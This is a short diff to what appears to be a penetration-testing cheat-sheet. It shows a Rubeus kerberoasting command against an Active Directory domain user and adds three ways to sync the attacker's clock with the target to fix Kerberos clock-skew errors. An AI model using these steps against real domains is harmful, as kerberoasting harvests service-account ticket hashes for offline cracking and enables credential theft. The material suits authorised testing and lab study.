@@ -62,4 +62,24 @@ Kerberoasting Attack - Rubeus
 ./Rubeus.exe kerberoast /domain:<domain.local> /user:<username> /nowrap
 
 
+----------------------------------------------------
+  Kerberoasting Attack - Fix Clock Skew Too Great
+----------------------------------------------------
+
+Method 1:
+
+sudo timedatectl set-ntp off
+sudo rdate -n <target ip>
+
+Method 2:
+
+sudo ntpdate <target ip>
+
+Method 3:
+
+sudo ntpdate -s <target ip>
+sudo ntpdate -s <hostname>
+
+
+
 
